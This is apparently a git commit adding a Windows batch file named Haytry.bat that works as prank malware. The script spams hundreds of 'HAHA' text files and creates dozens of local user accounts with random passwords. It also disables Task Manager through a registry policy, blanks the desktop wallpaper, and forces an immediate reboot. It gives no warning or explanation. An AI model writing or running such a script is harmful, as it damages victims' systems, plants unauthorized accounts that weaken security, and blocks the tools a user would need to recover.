c244d188336f241854b27c70806c57865d1df683
IWasBoredLol <130590302+IWasBoredLol@users.noreply.github.com>
2023-06-21 19:04:53 +0200

    Add files via upload

---
+++ Haytry.bat
@@ -0,0 +1,312 @@
+@echo off
+cd %~dp0
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+clsecho HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+cls
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+cls
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+cls
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+echo HAHAHAHAHA > HAHA%random%.txt
+cls
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+cls
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+cls
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+net user "HAHAHA%random%" "%random%" /add
+cls
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
+cls
+reg add "HKCU\control panel\desktop" /v wallpaper /t REG_SZ /d "" /f 
+reg add "HKCU\control panel\desktop" /v wallpaper /t REG_SZ /d "dhjwodjwojdowjdowijdowijwoidjwoi.bmp" /f 
+reg delete "HKCU\Software\Microsoft\Internet Explorer\Desktop\General" /v WallpaperStyle /f
+reg add "HKCU\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 2 /f
+RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+cls
+shutdown -r -t 0
